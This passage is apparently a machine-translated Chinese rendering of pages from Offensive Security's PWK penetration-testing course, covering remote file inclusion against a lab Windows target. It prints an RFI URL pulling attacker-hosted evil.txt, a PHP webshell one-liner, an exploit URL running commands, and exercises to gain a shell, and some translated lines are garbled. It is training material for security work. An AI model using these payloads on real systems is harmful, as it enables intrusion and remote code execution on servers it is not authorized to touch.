<div style="position:absolute;top:113705;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">http://10.11.0.22/menu.php?file=http://10.11.0.4/evil.txt</font></font></nobr></div>
<div style="position:absolute;top:113724;left:299"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 300 - 将文件参数用于 RFI 负载</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:113753;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">此请求将强制 PHP 网络服务器尝试包含来自 Kali 攻击的远程文件</font></font></nobr></div>
<div style="position:absolute;top:113773;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">机器。</font><font style="vertical-align: inherit;">我们可以通过在我们的 Kali 机器上启动一个 netcat 监听器来测试这个，然后提交</font></font></nobr></div>
<div style="position:absolute;top:113792;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们的 Windows 10 目标上的 URL：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:113827;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sudo nc -nvlp 80</font></font></font></b></nobr></div>
<div style="position:absolute;top:113844;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">听[任何] 80 ...</font></font></nobr></div>
<div style="position:absolute;top:113861;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">从（未知）[10.11.0.22] 50324 连接到 [10.11.0.4]</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:113878;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">GET /evil.txt HTTP/1.0</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:113895;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">主机：10.11.0.4</font></font></nobr></div>
<div style="position:absolute;top:113912;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">连接：关闭</font></font></nobr></div>
<div style="position:absolute;top:113931;left:321"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 301 - 使用 Netcat 侦听器验证 RFI</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:113960;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">输出显示，当 URL 提交时，Windows 10 机器确实到达</font></font></nobr></div>
<div style="position:absolute;top:113980;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">到我们的 Kali 机器上尝试检索 evil.txt 文件。</font><font style="vertical-align: inherit;">如果文件被检索，它会</font></font></nobr></div>
<div style="position:absolute;top:113999;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">进一步尝试包括和执行它。</font></font></nobr></div>
<div style="position:absolute;top:114032;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">虽然这是一个简单的例子，但 URL 是有效的并且过程正在运行，基本上允许</font></font></nobr></div>
<div style="position:absolute;top:114051;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们加载和执行托管在远程 Web 服务器上的任何文件。 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:114223;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="97"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 97 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:114256;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:115333;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:115333;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:115333;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">317</font></font></nobr></div>
</span></font>
<font size="2" color="#ffffff" face="Times"><span style="font-size:5px;font-family:Times;color:#ffffff">
<div style="position:absolute;top:114346;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">9.4.4.6.1</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:14px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:114396;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">旧版本的 PHP 存在一个漏洞，其中空字节</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">278</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> (%00) 将</font></font></i></nobr></div>
<div style="position:absolute;top:114415;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">终止任何字符串。</font><font style="vertical-align: inherit;">这个技巧可以用来绕过添加的文件扩展名</font></font></i></nobr></div>
<div style="position:absolute;top:114435;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">服务器端，对于文件包含很有用，因为它可以防止文件扩展名</font></font></i></nobr></div>
<div style="position:absolute;top:114454;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">不被视为字符串的一部分。</font><font style="vertical-align: inherit;">换句话说，如果一个应用程序</font></font></i></nobr></div>
<div style="position:absolute;top:114473;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">读入一个参数并将“.php”附加到它，在参数中传递一个空字节</font></font></i></nobr></div>
<div style="position:absolute;top:114493;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">有效地结束没有“.php”扩展名的字符串。</font><font style="vertical-align: inherit;">这给攻击者</font></font></i></nobr></div>
<div style="position:absolute;top:114512;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用文件包含漏洞加载哪些文件具有更大的灵活性。</font></font></i></nobr></div>
<div style="position:absolute;top:114558;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">RFI 有效载荷的另一个技巧是用问号 (?) 结束它们来标记</font></font></i></nobr></div>
<div style="position:absolute;top:114578;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">作为查询字符串的一部分添加到 URL 服务器端的任何内容。</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:114640;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为了看到这一点，我们可以设置我们的 Apache 服务器来托管一个恶意的 evil.txt 文件</font></font></nobr></div>
<div style="position:absolute;top:114659;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们在日志中毒攻击中使用的 PHP 命令外壳。</font><font style="vertical-align: inherit;">创建文件后，我们将刷新</font></font></nobr></div>
<div style="position:absolute;top:114679;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Apache 快速重启：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:114713;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:/var/www/html$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cat evil.txt</font></font></font></b></nobr></div>
<div style="position:absolute;top:114730;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&lt;?php echo shell_exec($_GET['cmd']); </font><font style="vertical-align: inherit;">?&gt;</font></font></nobr></div>
<div style="position:absolute;top:114764;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:/var/www/html$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sudo systemctl restart apache2</font></font></font></b></nobr></div>
<div style="position:absolute;top:114784;left:294"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 302 - 创建 RFI 负载并启动 Apache</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:114813;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">一旦文件就位并且我们的 Web 服务器正在运行，我们就可以将 RFI 攻击 URL 发送到</font></font></nobr></div>
<div style="position:absolute;top:114832;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Windows 10 机器上的易受攻击的 Web 应用程序，看看我们的代码是否执行：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:114867;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">http://10.11.0.22/menu.php? </font></font><b><font color="#00b050"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">文件=http://10.11.0.4/evil.txt </font></font></font><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&amp;cmd=ipconfig</font></font></font></b></nobr></div>
<div style="position:absolute;top:114887;left:336"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 303 - 利用 RFI 漏洞</font></font></i></nobr></div>
<div style="position:absolute;top:115151;left:339"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 157：利用 RFI 漏洞</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:115182;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">优秀的。</font><font style="vertical-align: inherit;">该漏洞正在发挥作用。</font><font style="vertical-align: inherit;">我们的代码来自远程服务器并成功</font></font></nobr></div>
<div style="position:absolute;top:115202;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">执行。</font><font style="vertical-align: inherit;">这是一个非常简单的</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">webshel​​l</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:115283;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">278 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（PHP 集团，2019 年），https://www.php.net/manual/en/security.filesystem.nullbytes.php</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:115411;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="98"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 98 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:115444;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:116521;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:116521;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:116521;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">318</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:115540;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">webshel​​l 是一个提供基于 Web 的命令行界面的小软件，使</font></font></nobr></div>
<div style="position:absolute;top:115559;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">执行命令更容易、更方便。</font><font style="vertical-align: inherit;">webshel​​l和Kali的种类很多</font></font></nobr></div>
<div style="position:absolute;top:115578;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在/usr/share/webshel​​ls 中包含了几个，编写了许多常见的 web 应用程序编程</font></font></nobr></div>
<div style="position:absolute;top:115598;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">语言。</font><font style="vertical-align: inherit;">与往常一样，在使用这些文件之前，请查看它们的内容。</font></font></nobr></div>
<div style="position:absolute;top:115631;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">基于这些简单示例的成功，我们可以使用 Apache（或其他 HTTP 服务器）来</font></font></nobr></div>
<div style="position:absolute;top:115650;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为 RFI 托管这些外壳，扩展我们的能力。</font></font></nobr></div>
<div style="position:absolute;top:115683;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">既然我们可以在服务器上执行代码，那么从代码执行开始应该是一件简单的事情</font></font></nobr></div>
<div style="position:absolute;top:115702;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在 Kali Linux 中包含的 webshel​​l 的帮助下进入一个 shell。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:115736;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">9.4.4.7 练习</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:115767;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1、利用web应用中的RFI漏洞，获取shell。</font></font></nobr></div>
<div style="position:absolute;top:115795;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2.以/menu2.php?file=current_menu为起点，使用RFI获取shell。</font></font></nobr></div>
<div style="position:absolute;top:115823;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3. 使用 Kali 附带的 webshel​​l 之一在 Windows 10 目标上获取 shell。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:115857;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">9.4.4.8 扩展您的曲目</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:115892;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">现在我们已经了解了基础知识，让我们看看一些方法来扩展我们的曲目。</font></font></nobr></div>
<div style="position:absolute;top:115925;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">首先，让我们看看一些 Apache 替代品。</font></font></nobr></div>
<div style="position:absolute;top:115958;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Kali 包括几个可以创建 HTTP 服务器的工具。</font><font style="vertical-align: inherit;">如果我们需要，这特别有用</font></font></nobr></div>
<div style="position:absolute;top:115977;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在任意端口上快速建立 HTTP 服务器。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:14px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:116039;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">请注意，以下示例使用注册端口，但我们也可以运行</font></font></i></nobr></div>
<div style="position:absolute;top:116059;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如果我们使用 root 用户权限运行命令，则系统端口上的服务器。</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:116121;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">例如，我们可以通过设置</font><b><font style="font-size:13px"><font style="vertical-align: inherit;">-m</font></font></b><font style="vertical-align: inherit;">在 Python 2.x 中的任意端口上启动 HTTP 服务器</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"></font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:13px;font-family:Times">
<div style="position:absolute;top:116141;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SimpleHTTPServer</font></font></b><font style="font-size:14px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">设置所需的模块和</font></font></font><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">7331</font></font></b><font style="font-size:14px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">设置 TCP 端口：</font></font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:116175;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">python -m SimpleHTTPServer 7331</font></font></font></b></nobr></div>
<div style="position:absolute;top:116192;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在 0.0.0.0 端口 7331 上提供 HTTP ...</font></font></nobr></div>
<div style="position:absolute;top:116211;left:276"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 304 - 使用 Python 2 在端口 7331 上运行 HTTP 服务器</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:116241;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">语法与 Python 3.x 略有不同，因为模块名称不同：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:116275;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">python3 -m http.server 7331</font></font></font></b></nobr></div>
<div style="position:absolute;top:116293;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在 0.0.0.0 端口 7331 (http://0.0.0.0:7331/) 上提供 HTTP ...</font></font></nobr></div>
<div style="position:absolute;top:116312;left:276"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 305 - 使用 Python 3 在端口 7331 上运行 HTTP 服务器</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:116341;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这两个命令都将启动一个 HTTP 服务器并托管当前工作中的任何文件或目录</font></font></nobr></div>
<div style="position:absolute;top:116361;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">小路。</font></font></nobr></div>
<div style="position:absolute;top:116393;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PHP 包含一个内置的 Web 服务器，可以使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-S</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">标志后跟地址</font><font style="vertical-align: inherit;">来启动</font></font></nobr></div>
<div style="position:absolute;top:116413;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和端口使用：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:116448;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">php -S 0.0.0.0:8000</font></font></font></b></nobr></div>
<div style="position:absolute;top:116465;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PHP 7.3.8-1 开发服务器于 2019 年 3 月 28 日星期三 12:59:52 启动 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:116599;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="99"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 99 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:116632;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:117709;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:117709;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:117709;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">319</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:116728;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">收听 http://0.0.0.0:8000</font></font></nobr></div>
<div style="position:absolute;top:116744;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">文档根目录是 /home/kali</font></font></nobr></div>
<div style="position:absolute;top:116761;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">按 Ctrl-C 退出。</font></font></nobr></div>
<div style="position:absolute;top:116781;left:288"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 306 - 使用 PHP 在端口 8000 上运行 HTTP 服务器</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:116810;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们还可以使用 Ruby“one liner”启动 HTTP 服务器。</font><font style="vertical-align: inherit;">该命令需要几个标志</font></font></nobr></div>
<div style="position:absolute;top:116830;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">包括</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-run</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">以加载 un.rb，其中包含对常见 Unix 命令的替换，</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-e httpd</font></font></font></b></nobr></div>
<div style="position:absolute;top:116849;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">运行 HTTP 服务器，</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">. </font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">提供当前目录中的内容，</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-p 9000</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">设置 TCP</font></font></nobr></div>
<div style="position:absolute;top:116869;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">港口：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:116903;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ruby -run -e httpd 。</font><font style="vertical-align: inherit;">-p 9000</font></font></font></b></nobr></div>
<div style="position:absolute;top:116920;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[2019-08-28 12:44:14] INFO WEBrick 1.4.2</font></font></nobr></div>
<div style="position:absolute;top:116937;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[2019-08-28 12:44:14] 信息 ruby​​ 2.5.5 (2019-03-15) [x86_64-linux-gnu]</font></font></nobr></div>
<div style="position:absolute;top:116954;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[2019-08-28 12:44:14] 信息 WEBrick::HTTPServer#start: pid=1367 port=9000</font></font></nobr></div>
<div style="position:absolute;top:116973;left:286"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 307 - 使用 Ruby 在端口 9000 上运行 HTTP 服务器</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:117003;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们还可以使用</font><font style="vertical-align: inherit;">“嵌入式 Linux 的瑞士军刀” </font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">busybox</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">来运行 HTTP 服务器</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:13px;font-family:Times">
<div style="position:absolute;top:117023;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">httpd</font></font></b><font style="font-size:14px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">作为函数，</font></font></font><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-f</font></font></b><font style="font-size:14px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">交互运行，</font></font></font><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-p 10000</font></font></b><font style="font-size:14px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在 TCP 端口 10000 上运行：</font></font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:117057;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">busybox httpd -f -p 10000</font></font></font></b></nobr></div>
<div style="position:absolute;top:117093;left:272"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 308 - 使用 BusyBox 在端口 10000 上运行 HTTP 服务器</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:117123;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">要停止这些服务器中的任何一个，我们可以简单地点击</font></font><font style="font-size:36px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C c</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font></font></nobr></div>
<div style="position:absolute;top:117156;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">接下来，让我们讨论 PHP 包装器。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:117190;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">9.4.4.9 PHP 包装器</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:117225;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PHP 提供了几个协议包装器</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">279</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，我们可以使用它们来利用目录遍历和本地</font></font></nobr></div>
<div style="position:absolute;top:117244;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">文件包含漏洞。</font><font style="vertical-align: inherit;">这些过滤器在尝试注入 PHP 时为我们提供了额外的灵活性</font></font></nobr></div>
<div style="position:absolute;top:117263;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通过 LFI 漏洞编写代码。</font></font></nobr></div>
<div style="position:absolute;top:117296;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们可以使用</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">data </font></font></i><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">280</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">包装器将内联数据嵌入为带有纯文本或</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">base64 </font></font></i><font style="vertical-align: inherit;"><font style="font-size:8px"><font style="vertical-align: inherit;">281</font></font><font style="vertical-align: inherit;">的 URL 的一部分</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"></font></font></nobr></div>
<div style="position:absolute;top:117316;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">编码数据。</font><font style="vertical-align: inherit;">当我们不能毒害本地</font></font></nobr></div>
<div style="position:absolute;top:117335;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">带有 PHP 代码的文件。</font></font></nobr></div>
<div style="position:absolute;top:117368;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">让我们仔细看看如何使用数据包装器。</font><font style="vertical-align: inherit;">我们以“data:”开头，然后是类型</font></font></nobr></div>
<div style="position:absolute;top:117387;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">数据。</font><font style="vertical-align: inherit;">在这种情况下，我们将对纯文本使用“text/plain”。</font><font style="vertical-align: inherit;">我们用逗号来标记开始</font></font></nobr></div>
